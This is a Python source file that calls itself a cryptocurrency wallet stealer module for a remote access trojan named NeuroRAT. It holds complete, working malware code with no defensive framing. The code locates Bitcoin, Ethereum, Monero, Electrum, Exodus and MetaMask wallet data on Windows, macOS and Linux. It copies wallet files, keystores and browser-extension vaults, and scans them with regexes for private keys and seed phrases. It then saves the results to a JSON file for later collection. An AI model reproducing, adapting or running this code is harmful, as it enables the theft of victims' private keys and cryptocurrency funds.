#!/usr/bin/env python3
# Cryptocurrency Wallet Stealer Module for NeuroRAT
# Author: Mr. Thomas Anderson <iamnobodynothing@gmail.com>
# Description: Extracts wallet files, private keys, and seed phrases from popular cryptocurrency wallets

import os
import re
import sys
import json
import shutil
import base64
import sqlite3
import platform
import tempfile
import traceback
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple, Set

class CryptoStealer:
    def __init__(self, output_dir: str = None):
        """Initialize the cryptocurrency wallet stealer module."""
        self.system = platform.system().lower()
        self.temp_dir = tempfile.mkdtemp()
        self.output_dir = output_dir or os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.log_file = os.path.join(self.output_dir, "crypto_stealer.log")
        
        # Define wallet paths based on operating system
        self._setup_wallet_paths()
        
        # Regex patterns for private keys and seed phrases
        self._setup_crypto_patterns()

    def _log(self, message: str):
        """Log messages to file."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] {message}\n")

    def _setup_wallet_paths(self):
        """Setup wallet paths based on the operating system."""
        self.wallet_paths = {}
        
        if self.system == "windows":
            appdata = os.environ.get("APPDATA", "")
            localappdata = os.environ.get("LOCALAPPDATA", "")
            
            self.wallet_paths = {
                "bitcoin": [os.path.join(appdata, "Bitcoin")],
                "ethereum": [
                    os.path.join(appdata, "Ethereum"),
                    os.path.join(appdata, "Ethereum Wallet")
                ],
                "monero": [os.path.join(appdata, "monero-wallet")],
                "litecoin": [os.path.join(appdata, "Litecoin")],
                "exodus": [os.path.join(appdata, "Exodus")],
                "electrum": [os.path.join(appdata, "Electrum")],
                "metamask": [
                    os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
                    os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm"),
                    os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
                ],
                "atomic": [os.path.join(appdata, "atomic")],
                "jaxx": [os.path.join(appdata, "jaxx")],
                "armory": [os.path.join(appdata, "Armory")],
                "guarda": [os.path.join(appdata, "Guarda")]
            }
            
        elif self.system == "darwin":  # macOS
            home = os.path.expanduser("~")
            
            self.wallet_paths = {
                "bitcoin": [
                    os.path.join(home, "Library", "Application Support", "Bitcoin")
                ],
                "ethereum": [
                    os.path.join(home, "Library", "Ethereum"),
                    os.path.join(home, "Library", "Application Support", "Ethereum Wallet")
                ],
                "monero": [os.path.join(home, "Library", "monero-wallet")],
                "litecoin": [os.path.join(home, "Library", "Application Support", "Litecoin")],
                "exodus": [os.path.join(home, "Library", "Application Support", "Exodus")],
                "electrum": [os.path.join(home, "Library", "Application Support", "Electrum")],
                "metamask": [
                    os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
                    os.path.join(home, "Library", "Application Support", "Microsoft Edge", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm"),
                    os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
                ],
                "atomic": [os.path.join(home, "Library", "Application Support", "atomic")],
                "jaxx": [os.path.join(home, "Library", "Application Support", "jaxx")],
                "armory": [os.path.join(home, "Library", "Application Support", "Armory")],
                "guarda": [os.path.join(home, "Library", "Application Support", "Guarda")]
            }
            
        elif self.system == "linux":
            home = os.path.expanduser("~")
            
            self.wallet_paths = {
                "bitcoin": [
                    os.path.join(home, ".bitcoin"),
                    os.path.join(home, ".config", "bitcoin")
                ],
                "ethereum": [
                    os.path.join(home, ".ethereum"),
                    os.path.join(home, ".config", "ethereum")
                ],
                "monero": [
                    os.path.join(home, ".monero-wallet"),
                    os.path.join(home, ".config", "monero-wallet")
                ],
                "litecoin": [
                    os.path.join(home, ".litecoin"),
                    os.path.join(home, ".config", "litecoin")
                ],
                "exodus": [
                    os.path.join(home, ".config", "Exodus"),
                    os.path.join(home, ".config", "exodus")
                ],
                "electrum": [
                    os.path.join(home, ".electrum"),
                    os.path.join(home, ".config", "electrum")
                ],
                "metamask": [
                    os.path.join(home, ".config", "google-chrome", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
                    os.path.join(home, ".config", "microsoft-edge", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm"),
                    os.path.join(home, ".config", "BraveSoftware", "Brave-Browser", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
                ],
                "atomic": [
                    os.path.join(home, ".config", "atomic"),
                    os.path.join(home, ".atomic")
                ],
                "jaxx": [
                    os.path.join(home, ".config", "jaxx"),
                    os.path.join(home, ".jaxx")
                ],
                "armory": [
                    os.path.join(home, ".armory"),
                    os.path.join(home, ".config", "armory")
                ],
                "guarda": [
                    os.path.join(home, ".config", "guarda"),
                    os.path.join(home, ".guarda")
                ]
            }

    def _setup_crypto_patterns(self):
        """Setup regex patterns for private keys and seed phrases."""
        self.crypto_patterns = {
            "private_keys": {
                "bitcoin_wif": re.compile(r"[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$"),
                "bitcoin_hex": re.compile(r"[0-9a-fA-F]{64}$"),
                "ethereum": re.compile(r"0x[0-9a-fA-F]{64}$"),
                "metamask": re.compile(r'"mnemonic":("[^"]*")'),
                "electrum_seed": re.compile(r'"seed":"([^"]*)"'),
                "electrum_salt": re.compile(r'"salt":"([^"]*)"'),
                "xprv": re.compile(r"xprv[a-zA-Z0-9]{107,108}$"),
                "monero_spend_key": re.compile(r'"spend_key":"([0-9a-fA-F]{64})"'),
                "monero_view_key": re.compile(r'"view_key":"([0-9a-fA-F]{64})"')
            },
            "seed_phrases": {
                # BIP39 seed phrases are typically 12, 15, 18, 21, or 24 words
                "bip39": re.compile(r"\b([a-z]+\s+){11,23}[a-z]+\b")
            }
        }

    def _copy_file(self, src_file: str, dst_dir: str) -> str:
        """Copy a file to the destination directory."""
        if not os.path.exists(src_file):
            return None
            
        try:
            filename = os.path.basename(src_file)
            dst_file = os.path.join(dst_dir, filename)
            shutil.copy2(src_file, dst_file)
            return dst_file
        except Exception as e:
            self._log(f"Error copying file {src_file}: {str(e)}")
            return None

    def _scan_file_for_patterns(self, file_path: str) -> Dict[str, List[str]]:
        """Scan a file for cryptocurrency related patterns."""
        results = {}
        
        if not os.path.exists(file_path) or os.path.isdir(file_path):
            return results
            
        try:
            # Skip large files
            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10 MB
                return results
                
            # Skip binary files
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except UnicodeDecodeError:
                # Try to read as binary for JSON files that might contain binary data
                if file_path.endswith('.json'):
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                    except Exception:
                        return results
                else:
                    return results
            
            # Check for private keys
            for key_type, pattern in self.crypto_patterns["private_keys"].items():
                matches = pattern.findall(content)
                if matches:
                    if key_type not in results:
                        results[key_type] = []
                    results[key_type].extend(matches)
            
            # Check for seed phrases
            for phrase_type, pattern in self.crypto_patterns["seed_phrases"].items():
                matches = pattern.findall(content)
                if matches:
                    if phrase_type not in results:
                        results[phrase_type] = []
                    results[phrase_type].extend(matches)
            
        except Exception as e:
            self._log(f"Error scanning file {file_path}: {str(e)}")
            
        return results

    def _scan_directory_for_patterns(self, directory: str) -> Dict[str, Dict[str, List[str]]]:
        """Recursively scan a directory for cryptocurrency related patterns."""
        results = {}
        
        if not os.path.exists(directory) or not os.path.isdir(directory):
            return results
            
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    file_results = self._scan_file_for_patterns(file_path)
                    
                    if file_results:
                        relative_path = os.path.relpath(file_path, directory)
                        results[relative_path] = file_results
                        
        except Exception as e:
            self._log(f"Error scanning directory {directory}: {str(e)}")
            
        return results

    def extract_bitcoin_wallet(self) -> Dict[str, Any]:
        """Extract Bitcoin wallet files and scan for keys."""
        results = {"files": [], "patterns": {}}
        
        for wallet_path in self.wallet_paths.get("bitcoin", []):
            if not os.path.exists(wallet_path):
                continue
                
            wallet_dir = os.path.join(self.output_dir, "bitcoin_wallet")
            os.makedirs(wallet_dir, exist_ok=True)
            
            # Copy wallet.dat file
            wallet_dat = os.path.join(wallet_path, "wallet.dat")
            if os.path.exists(wallet_dat):
                copied_file = self._copy_file(wallet_dat, wallet_dir)
                if copied_file:
                    results["files"].append(copied_file)
                    
            # Scan for patterns in config files
            bitcoin_conf = os.path.join(wallet_path, "bitcoin.conf")
            if os.path.exists(bitcoin_conf):
                patterns = self._scan_file_for_patterns(bitcoin_conf)
                if patterns:
                    results["patterns"]["bitcoin.conf"] = patterns
                    
                copied_file = self._copy_file(bitcoin_conf, wallet_dir)
                if copied_file:
                    results["files"].append(copied_file)
            
            # Scan wallet directory for patterns
            dir_patterns = self._scan_directory_for_patterns(wallet_path)
            if dir_patterns:
                results["patterns"].update(dir_patterns)
                
        return results

    def extract_ethereum_wallet(self) -> Dict[str, Any]:
        """Extract Ethereum wallet files and scan for keys."""
        results = {"files": [], "patterns": {}}
        
        for wallet_path in self.wallet_paths.get("ethereum", []):
            if not os.path.exists(wallet_path):
                continue
                
            wallet_dir = os.path.join(self.output_dir, "ethereum_wallet")
            os.makedirs(wallet_dir, exist_ok=True)
            
            # Look for keystore directory
            keystore_dir = os.path.join(wallet_path, "keystore")
            if os.path.exists(keystore_dir) and os.path.isdir(keystore_dir):
                # Copy all files in keystore directory
                for file in os.listdir(keystore_dir):
                    file_path = os.path.join(keystore_dir, file)
                    if os.path.isfile(file_path):
                        copied_file = self._copy_file(file_path, wallet_dir)
                        if copied_file:
                            results["files"].append(copied_file)
                            
            # Scan for patterns in any config files
            for config_file in ["config.json", "settings.json"]:
                config_path = os.path.join(wallet_path, config_file)
                if os.path.exists(config_path):
                    patterns = self._scan_file_for_patterns(config_path)
                    if patterns:
                        results["patterns"][config_file] = patterns
                        
                    copied_file = self._copy_file(config_path, wallet_dir)
                    if copied_file:
                        results["files"].append(copied_file)
                        
            # Scan wallet directory for patterns
            dir_patterns = self._scan_directory_for_patterns(wallet_path)
            if dir_patterns:
                results["patterns"].update(dir_patterns)
                
        return results

    def extract_monero_wallet(self) -> Dict[str, Any]:
        """Extract Monero wallet files and scan for keys."""
        results = {"files": [], "patterns": {}}
        
        for wallet_path in self.wallet_paths.get("monero", []):
            if not os.path.exists(wallet_path):
                continue
                
            wallet_dir = os.path.join(self.output_dir, "monero_wallet")
            os.makedirs(wallet_dir, exist_ok=True)
            
            # Copy all wallet files
            for file in os.listdir(wallet_path):
                if file.endswith(".keys") or file.endswith(".address.txt") or file.endswith(".wallet"):
                    file_path = os.path.join(wallet_path, file)
                    copied_file = self._copy_file(file_path, wallet_dir)
                    if copied_file:
                        results["files"].append(copied_file)
                        
            # Scan wallet directory for patterns
            dir_patterns = self._scan_directory_for_patterns(wallet_path)
            if dir_patterns:
                results["patterns"].update(dir_patterns)
                
        return results

    def extract_electrum_wallet(self) -> Dict[str, Any]:
        """Extract Electrum wallet files and scan for keys."""
        results = {"files": [], "patterns": {}}
        
        for wallet_path in self.wallet_paths.get("electrum", []):
            if not os.path.exists(wallet_path):
                continue
                
            wallet_dir = os.path.join(self.output_dir, "electrum_wallet")
            os.makedirs(wallet_dir, exist_ok=True)
            
            # Copy wallet files
            for file in os.listdir(wallet_path):
                if file.endswith(".wallet") or file.endswith(".json"):
                    file_path = os.path.join(wallet_path, file)
                    if os.path.isfile(file_path):
                        copied_file = self._copy_file(file_path, wallet_dir)
                        if copied_file:
                            results["files"].append(copied_file)
                            
                        # Scan wallet file for patterns
                        patterns = self._scan_file_for_patterns(file_path)
                        if patterns:
                            results["patterns"][file] = patterns
                            
            # Look for config file
            config_file = os.path.join(wallet_path, "config")
            if os.path.exists(config_file):
                patterns = self._scan_file_for_patterns(config_file)
                if patterns:
                    results["patterns"]["config"] = patterns
                    
                copied_file = self._copy_file(config_file, wallet_dir)
                if copied_file:
                    results["files"].append(copied_file)
                    
            # Scan wallet directory for patterns
            dir_patterns = self._scan_directory_for_patterns(wallet_path)
            if dir_patterns:
                results["patterns"].update(dir_patterns)
                
        return results

    def extract_exodus_wallet(self) -> Dict[str, Any]:
        """Extract Exodus wallet files and scan for keys."""
        results = {"files": [], "patterns": {}}
        
        for wallet_path in self.wallet_paths.get("exodus", []):
            if not os.path.exists(wallet_path):
                continue
                
            wallet_dir = os.path.join(self.output_dir, "exodus_wallet")
            os.makedirs(wallet_dir, exist_ok=True)
            
            # Look for exodus.wallet directory
            exodus_wallet = os.path.join(wallet_path, "exodus.wallet")
            if os.path.exists(exodus_wallet) and os.path.isdir(exodus_wallet):
                # Copy relevant files
                for file in ["seed.seco", "passphrase.seco", "info.seco", "keystore.seco"]:
                    file_path = os.path.join(exodus_wallet, file)
                    if os.path.exists(file_path):
                        copied_file = self._copy_file(file_path, wallet_dir)
                        if copied_file:
                            results["files"].append(copied_file)
                            
            # Scan wallet directory for patterns
            dir_patterns = self._scan_directory_for_patterns(wallet_path)
            if dir_patterns:
                results["patterns"].update(dir_patterns)
                
        return results

    def extract_metamask_wallet(self) -> Dict[str, Any]:
        """Extract MetaMask wallet files and scan for keys."""
        results = {"files": [], "patterns": {}}
        
        for wallet_path in self.wallet_paths.get("metamask", []):
            if not os.path.exists(wallet_path):
                continue
                
            wallet_dir = os.path.join(self.output_dir, "metamask_wallet")
            os.makedirs(wallet_dir, exist_ok=True)
            
            # Look for vault data files
            for file in ["LOG", "LOCK", "MANIFEST", "000003.log", "Local Storage"]:
                file_path = os.path.join(wallet_path, file)
                if os.path.exists(file_path):
                    if os.path.isdir(file_path):
                        # Create a subdirectory for this
                        sub_dir = os.path.join(wallet_dir, file)
                        os.makedirs(sub_dir, exist_ok=True)
                        
                        # Copy files in the subdirectory
                        for sub_file in os.listdir(file_path):
                            sub_file_path = os.path.join(file_path, sub_file)
                            if os.path.isfile(sub_file_path):
                                copied_file = self._copy_file(sub_file_path, sub_dir)
                                if copied_file:
                                    results["files"].append(copied_file)
                    else:
                        copied_file = self._copy_file(file_path, wallet_dir)
                        if copied_file:
                            results["files"].append(copied_file)
                            
            # Scan for leveldb files that might contain vault data
            for file in os.listdir(wallet_path):
                if file.startswith("LOG") or file.endswith(".ldb") or file.endswith(".log"):
                    file_path = os.path.join(wallet_path, file)
                    if os.path.isfile(file_path):
                        patterns = self._scan_file_for_patterns(file_path)
                        if patterns:
                            results["patterns"][file] = patterns
                            
                        copied_file = self._copy_file(file_path, wallet_dir)
                        if copied_file:
                            results["files"].append(copied_file)
                            
            # Scan wallet directory for patterns
            dir_patterns = self._scan_directory_for_patterns(wallet_path)
            if dir_patterns:
                results["patterns"].update(dir_patterns)
                
        return results

    def extract_all_wallets(self) -> Dict[str, Dict[str, Any]]:
        """Extract data from all supported cryptocurrency wallets."""
        self._log("Starting extraction of cryptocurrency wallets")
        
        results = {}
        
        # Bitcoin
        if "bitcoin" in self.wallet_paths:
            self._log("Extracting Bitcoin wallet")
            bitcoin_results = self.extract_bitcoin_wallet()
            if bitcoin_results["files"] or bitcoin_results["patterns"]:
                results["bitcoin"] = bitcoin_results
                
        # Ethereum
        if "ethereum" in self.wallet_paths:
            self._log("Extracting Ethereum wallet")
            ethereum_results = self.extract_ethereum_wallet()
            if ethereum_results["files"] or ethereum_results["patterns"]:
                results["ethereum"] = ethereum_results
                
        # Monero
        if "monero" in self.wallet_paths:
            self._log("Extracting Monero wallet")
            monero_results = self.extract_monero_wallet()
            if monero_results["files"] or monero_results["patterns"]:
                results["monero"] = monero_results
                
        # Electrum
        if "electrum" in self.wallet_paths:
            self._log("Extracting Electrum wallet")
            electrum_results = self.extract_electrum_wallet()
            if electrum_results["files"] or electrum_results["patterns"]:
                results["electrum"] = electrum_results
                
        # Exodus
        if "exodus" in self.wallet_paths:
            self._log("Extracting Exodus wallet")
            exodus_results = self.extract_exodus_wallet()
            if exodus_results["files"] or exodus_results["patterns"]:
                results["exodus"] = exodus_results
                
        # MetaMask
        if "metamask" in self.wallet_paths:
            self._log("Extracting MetaMask wallet")
            metamask_results = self.extract_metamask_wallet()
            if metamask_results["files"] or metamask_results["patterns"]:
                results["metamask"] = metamask_results
                
        # Add more wallets as needed...
        
        return results

    def save_results(self, wallet_data: Dict[str, Dict[str, Any]]) -> str:
        """Save extracted wallet data to a file."""
        output_file = os.path.join(self.output_dir, f"crypto_wallets_{datetime.now().strftime('%Y%m%d%H%M%S')}.json")
        
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(wallet_data, f, indent=2)
                
            self._log(f"Cryptocurrency wallet data saved to {output_file}")
            return output_file
        except Exception as e:
            self._log(f"Error saving cryptocurrency wallet data: {str(e)}")
            return None

    def clean_up(self):
        """Clean up temporary files."""
        try:
            shutil.rmtree(self.temp_dir)
            self._log("Temporary files cleaned up")
        except Exception as e:
            self._log(f"Error cleaning up temporary files: {str(e)}")

    def run(self) -> str:
        """Run the cryptocurrency wallet extraction process."""
        try:
            wallet_data = self.extract_all_wallets()
            output_file = self.save_results(wallet_data)
            self.clean_up()
            return output_file
        except Exception as e:
            self._log(f"Error in crypto stealer module: {str(e)}")
            self._log(traceback.format_exc())
            return None

def main():
    """Main function to run the cryptocurrency wallet stealer module."""
    try:
        output_dir = sys.argv[1] if len(sys.argv) > 1 else None
        stealer = CryptoStealer(output_dir)
        result_file = stealer.run()
        
        if result_file:
            print(f"Cryptocurrency wallet data extracted and saved to: {result_file}")
        else:
            print("Failed to extract cryptocurrency wallet data")
    except Exception as e:
        print(f"Error: {str(e)}")
        print(traceback.format_exc())

if __name__ == "__main__":
    main() 